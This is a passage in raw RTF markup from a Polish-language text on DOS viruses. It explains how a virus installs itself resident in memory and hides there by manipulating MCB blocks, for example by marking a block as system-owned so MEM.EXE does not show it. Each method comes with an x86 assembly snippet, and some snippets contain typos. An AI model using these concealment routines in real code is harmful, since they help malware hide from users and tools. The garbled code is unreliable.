\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Znacznik bloku; znak 'M' oznacza, i\uc1\u380\'bf jest to blok po\uc1\u347\'9credni, za\uc1\u347\'9c Z oznacza ostatni blok w \uc1\u322\'b3a\uc1\u324\'f1cuchu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01-02}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres (tylko segment; przesuni\uc1\u281\'eacie r\'f3wne jest zeru) bloku PSP, b\uc1\u281\'ead\uc1\u261\'b9cego w\uc1\u322\'b3a\uc1\u347\'9ccicielem MCB. Je\uc1\u380\'bfeli w pole to wpiszemy warto\uc1\u347\'9c\uc1\u263\'e6 0008, a wi\uc1\u281\'eac segment niedost\uc1\u281\'eapny dla program\'f3w, segment zniknie z pami\uc1\u281\'eaci operacyjnej i b\uc1\u281\'eadzie niewidoczny dla program\'f3w przegl\uc1\u261\'b9daj\uc1\u261\'b9cych pami\uc1\u281\'ea\uc1\u263\'e6 (dok\uc1\u322\'b3adniej: b\uc1\u281\'eadzie widoczny, ale b\uc1\u281\'eadzie traktowany jako integralna cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 systemu)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}03-04}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Rozmiar bloku w 16-bajtowych paragrafach }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}05-07}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Zarezerwowane dla systemu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08-0F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}8-bajtowe pole, wykorzystywane dopiero w wersjach 5.0 DOS i wy\uc1\u380\'bfszych. Zawiera ono pocz\uc1\u261\'b9tek nazwy pliku w\uc1\u322\'b3a\uc1\u347\'9cciciela bloku MCB. Je\uc1\u380\'bfeli wpiszemy w to pole 'SC' lub 'SD', to blok ten zostanie uznany za blok systemowy ('SC' to skr\'f3t od System Code. a SD od Sys}{\f1\fs24\lang1045{\*\listtag0}tem Data)}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najstarsza i najbardziej rozpowszechniona metoda instalacji w pami\uc1\u281\'eaci operacyjnej polega na modyfikacji \uc1\u322\'b3a\uc1\u324\'f1cucha blok\'f3w MCB. Najpro\uc1\u347\'9cciej jest znale\uc1\u378\'9f\uc1\u263\'e6 ostatni z blok\'f3w MCB i zmniejszy\uc1\u263\'e6 jego rozmiar o d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 potrzebn\uc1\u261\'b9 wirusowi. Adres pierwszego bloku MCB mo\uc1\u380\'bfna znale\uc1\u378\'9f\uc1\u263\'e6 za pomoc\uc1\u261\'b9 funkcji (52/21). Po jej wywo\uc1\u322\'b3aniu w rejestrach ES:BX znajdzie si\uc1\u281\'ea adres tzw. listy list (LL). W kom\'f3rce pod adresem ES:[BX-2] znajduje si\uc1\u281\'ea informacja o adresie pierwszego nag\uc1\u322\'b3\'f3wka MCB. Po zdobyciu tego adresu nale\uc1\u380\'bfy, porus}{\f1\fs24\lang1045{\*\listtag0}z}{\f0\fs24\lang1045{\*\listtag0}aj\uc1\u261\'b9c si\uc1\u281\'ea po \uc1\u322\'b3a\uc1\u324\'f1cuchu, znale\uc1\u378\'9f\uc1\u263\'e6 ostami z MCB i dokona\uc1\u263\'e6 w nim zmian. Ca\uc1\u322\'b3o\uc1\u347\'9c\uc1\u263\'e6 realizuje si\uc1\u281\'ea za pomoc\uc1\u261\'b9 nast\uc1\u281\'eapuj\uc1\u261\'b9cej sekwencji:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Poszukiwanie ostatniego bloku w \uc1\u322\'b3a\uc1\u324\'f1cuchu mcb}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,52H               ; funkcja DOS - we\uc1\u378\'9f adres do listy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; list (ll) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21H                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,ES:[BX-2]         ; AX=adres segmentowy pierwszego MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NAST\uc1\u280\'caPNY:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DS,AX                ; ds wskazuje na sprawdzany blok MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP BYTE PTR DS:[0], Z   ; czy ostatni blok ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JE OSTATNI               ; skocz, je\uc1\u347\'9cli tak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INC AX                   ; dodaj rozmiar MCB (16 bajt\'f3w=1 paragraf) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ADD AX, DS:[3]           ; dodaj d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 bloku zarz\uc1\u261\'b9dzanego przez MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JMP SHORT NASTEPNY       ; sprawd\uc1\u378\'9f nast\uc1\u281\'eapny blok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OSTATNI:                 ; ds wskazuje na ostatni blok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB DS:[3], ROZMIAR      ; odejmij rozmiar wirusa (w paragrafach 16 bajtowych)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB DS:[12h], ROZMIAR    ;  warto tak\uc1\u380\'bfe zmieni\uc1\u263\'e6 adres pami\uc1\u281\'eaci niedost\uc1\u281\'eapnej dla \tab                  }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ;programu w PSP bie\uc1\u380\'bf\uc1\u261\'b9cego procesu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do instala}{\f0\fs24\lang1045{\*\listtag0}cji mo\uc1\u380\'bfna wykorzysta\uc1\u263\'e6 tak\uc1\u380\'bfe blok pami\uc1\u281\'eaci, kt\'f3ry powstaje poprzez zmniejszenie bloku pami\uc1\u281\'eaci przydzielonego programowi. Dokonuje tego nast\uc1\u281\'eapuj\uc1\u261\'b9ca sekwencja:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Zmniejszenie bloku przydzielonego aktualnemu procesowi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,62h                 ; funkcja DOS - we\uc1\u378\'9f adres PSP aktualnego procesu }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                    ; uruchom funkcj\uc1\u281\'ea DOS, BX zawiera adres PSP }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DEC BX                     ; BX-1 zawiera adres MCB, b\uc1\u281\'ead\uc1\u261\'b9cego w\uc1\u322\'b3a\uc1\u347\'9ccicielem bloku MOV DS,BX                  ; DS wskazuje na MCB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB DS:[3], ROZMIAR        ; odejmij rozmiar wirusa (w paragrafach 16 bajtowych) SUB DS:[12h], ROZMIAR      ; warto tak\uc1\u380\'bfe zmieni\uc1\u263\'e6 adres pami\uc1\u281\'eaci niedost\uc1\u281\'eapnej dla \tab }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                            ; programu w PSP bie\uc1\u380\'bf\uc1\u261\'b9cego procesu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Inny spos\'f3b polega na przydzieleniu sobie przez}{\f0\fs24\lang1045{\*\listtag0} wirusa bloku pami\uc1\u281\'eaci przy u\uc1\u380\'bfyciu (48/21) i modyfikacji MCB, b\uc1\u281\'ead\uc1\u261\'b9cego w\uc1\u322\'b3a\uc1\u347\'9ccicielem przydzielonego bloku. Modyfikacja polega na wpisaniu w pole 01h-02h bloku MCB warto\uc1\u347\'9cci 0008h, kt\'f3ra oznacza, i\uc1\u380\'bf blok ten nale\uc1\u380\'bfy do systemu operacyjnego DOS. Zamiast warto\uc1\u347\'9cc}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0} 0008h mo\uc1\u380\'bfna wpisa\uc1\u263\'e6 dowoln\uc1\u261\'b9 warto\uc1\u347\'9c\uc1\u263\'e6, kt\'f3ra wskazuje na segment zawieraj\uc1\u261\'b9cy na pewno dane systemowe, na przyk\uc1\u322\'b3ad liczb\uc1\u281\'ea z zakresu 0A000h-0B000h, wskazuj\uc1\u261\'b9c\uc1\u261\'b9 na segmenty zawieraj\uc1\u261\'b9ce pami\uc1\u281\'ea\uc1\u263\'e6 ekranu. Dodatkowo w pole 08h-0Fh mo\uc1\u380\'bfna wpisa\uc1\u263\'e6 \uc1\u322\'b3a\uc1\u324\'f1cuch 'SC lub 'SD' [o}{\f1\fs24\lang1045{\*\listtag0}d}{\f0\fs24\lang1045{\*\listtag0}powiadaj\uc1\u261\'b9ce skr\'f3tom: kod systemu (ang. System Code) i dane systemu (ang. System Data)]. Tak zmodyfikowany blok MCB nie b\uc1\u281\'eadzie widziany przez programy przegl\uc1\u261\'b9daj\uc1\u261\'b9ce pami\uc1\u281\'ea\uc1\u263\'e6 (np. MEM.EXE). Powy\uc1\u380\'bfsz\uc1\u261\'b9 metod\uc1\u281\'ea ilustruje nast\uc1\u281\'eapuj\uc1\u261\'b9ca sekwencja:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Tworzenie sztucznego bloku systemowego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,ROZMIAR           ; BX = rozmiar \uc1\u380\'bf\uc1\u261\'b9danej pami\uc1\u281\'eaci }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,48h               ; funkcja DOS - przydziel pami\uc1\u281\'ea\uc1\u263\'e6 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JC BLAD                  ; Je\uc1\u347\'9cli CF=1 to b\uc1\u322\'b3\uc1\u261\'b9d, AX=segment pami\uc1\u281\'eaci }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DEC AX                   ; AX-1=segment z nag\uc1\u322\'b3\'f3wkiem MCB (w\uc1\u322\'b3a\uc1\u347\'9ccicielem }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; bloku ami\uc1\u281\'eaci) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DS,AX                ;  DS = segment MCB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DS:[l],0008h         ;  zmie\uc1\u324\'f1 MCB na systemowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kolejny spos\'f3b instalacji w pami\uc1\u281\'eaci polega na wykorzystaniu faktu, i\uc1\u380\'bf DOS oferuje programom mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 zmieniania rozmiaru bloku pami\uc1\u281\'eaci przy u\uc1\u380\'bfyciu (4A/21). Dzi\uc1\u281\'eaki temu mo\uc1\u380\'bfna powi\uc1\u281\'eakszy\uc1\u263\'e6 pewien blok wykorzystywany przez system lub programy rezydentne i w tak wygospodarowane miejsce skopiowa\uc1\u263\'e6 wirusa. Nie t}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}zeba w tym wypadku dokonywa\uc1\u263\'e6 \uc1\u380\'bfadnych r\uc1\u281\'eacznych manipulacji na blokach MCB, gdy\uc1\u380\'bf wszystkie operacje wykona za nas system operacyjny. Nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6, i\uc1\u380\'bf aby DOS m\'f3g\uc1\u322\'b3 powi\uc1\u281\'eakszy\uc1\u263\'e6 blok pami\uc1\u281\'eaci, blok ten musi s\uc1\u261\'b9siadowa\uc1\u263\'e6 z jakim\uc1\u347\'9c nie wykorzystanym przez \uc1\u380\'bfaden pr}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}gram fragmentem pami\uc1\u281\'eaci. Znaleziony blok najlepiej zabezpieczy\uc1\u263\'e6 przed ewentualnym zwolnieniem, np. przez wpisanie w pole 03-04h warto\uc1\u347\'9cci 0008h. Sekwencja realizuj\uc1\u261\'b9ca to zadanie wygl\uc1\u261\'b9da nast\uc1\u281\'eapuj\uc1\u261\'b9co:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Powi\uc1\u281\'eakszenie jednego z blok\'f3w ju\uc1\u380\'bf u\uc1\u380\'bfytych }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,52H               ; funkcja DOS - we\uc1\u378\'9f adres do listy list (LL) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21H                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DX,ES:[BX-2]         ; AX==adres segmentowy pierwszego MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NAST\uc1\u280\'caPNY:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov es,dx                ; DS wskazuje na sprawdzany blok mcb}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov cl, byte PTR ES:[O]  ; zachowaj znacznik nag\uc1\u322\'b3\'f3wka MCB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,ES:[3]            ; pobierz rozmiar bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INC DX                   ; DOS wymaga adresu o l wi\uc1\u281\'eakszego od MCB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV ES,DX                ; ES wskazuje na blok pami\uc1\u281\'eaci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ADD DX,BX                ; dodaj d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 bloku zarz\uc1\u261\'b9dzanego przez MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ADD bx, rozmiar          ; dodaj rozmiar wirusa (w paragrafach 16-bajtowych) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,4Ah               ; spr\'f3buj zmieni\uc1\u263\'e6 rozmiar bloku }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNC JESTBLOK             ; je\uc1\u347\'9cli CFl, uda\uc1\u322\'b3o si\uc1\u281\'ea zmieni\uc1\u263\'e6 blok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP CL, Z                ; czy ostatni blok ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE NASTEPNY             ; sprawd\uc1\u378\'9f nast\uc1\u281\'eapny blok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OSTATNI:                 ; nie uda\uc1\u322\'b3o si\uc1\u281\'ea powi\uc1\u281\'eakszy\uc1\u263\'e6 \uc1\u380\'bfadnego bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ......                   ; cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 kodu wirusa, wykonuj\uc1\u261\'b9ca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab                    ;  si\uc1\u281\'ea, gdy nie znaleziono bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JESTBLOK:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ......                   ; uda\uc1\u322\'b3o si\uc1\u281\'ea powi\uc1\u281\'eakszy\uc1\u263\'e6 blok, adres do niego jest w ES}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Spos\'f3b obs\uc1\u322\'b3ugiwania pami\uc1\u281\'eaci przez DOS jest okre\uc1\u347\'9clany przez tzw. strategi\uc1\u281\'ea przydzia\uc1\u322\'b3u pami\uc1\u281\'eaci, kt\'f3ra standardowo nie u\uc1\u380\'bfywa blok\'f3w UMB, st\uc1\u261\'b9d powy\uc1\u380\'bfsze sposoby zadzia\uc1\u322\'b3aj\uc1\u261\'b9 bez zarzutu dla pami\uc1\u281\'eaci poni\uc1\u380\'bfej 640kB. Aby zainstalowa\uc1\u263\'e6 wirusa w pami\uc1\u281\'eaci UMB, trzeba wymusi\uc1\u263\'e6 jej u\uc1\u380\'bfywanie na r\'f3wni z pami\uc1\u281\'eaci\uc1\u261\'b9 nisk\uc1\u261\'b9. W tym celu nale\uc1\u380\'bfy przy\uc1\u322\'b3\uc1\u261\'b9czy\uc1\u263\'e6 \uc1\u322\'b3a\uc1\u324\'f1cuch blok\'f3w MCB pami\uc1\u281\'eaci UMB do \uc1\u322\'b3a\uc1\u324\'f1cucha blok\'f3w MCB, zn}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}jduj\uc1\u261\'b9cych si\uc1\u281\'ea w pami\uc1\u281\'eaci niskiej, przy u\uc1\u380\'bfyciu funkcji (5803/21). Ca\uc1\u322\'b3o\uc1\u347\'9c\uc1\u263\'e6 takiej operacji realizuje si\uc1\u281\'ea przy u\uc1\u380\'bfyciu nast\uc1\u281\'eapuj\uc1\u261\'b9cej sekwencji w asemblerze:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Do\uc1\u322\'b3\uc1\u261\'b9czanie pami\uc1\u281\'eaci UMB do \uc1\u322\'b3a\uc1\u324\'f1cucha UMB i zmiana strategii przydzia\uc1\u322\'b3u pami\uc1\u281\'eaci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,5800h             ; funkcja - pobierz aktualn\uc1\u261\'b9 strategi\uc1\u281\'ea }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PUSH AX                  ; zachowaj odczytane strategi\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,5802h             ; we\uc1\u378\'9f informacj\uc1\u281\'ea o do\uc1\u322\'b3\uc1\u261\'b9czeniu pami\uc1\u281\'eaci UMB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PUSH AX                  ; zachowaj informacj\uc1\u281\'ea na stosie}{\f2\fs24\lang1045{\*\listtag0}\par}
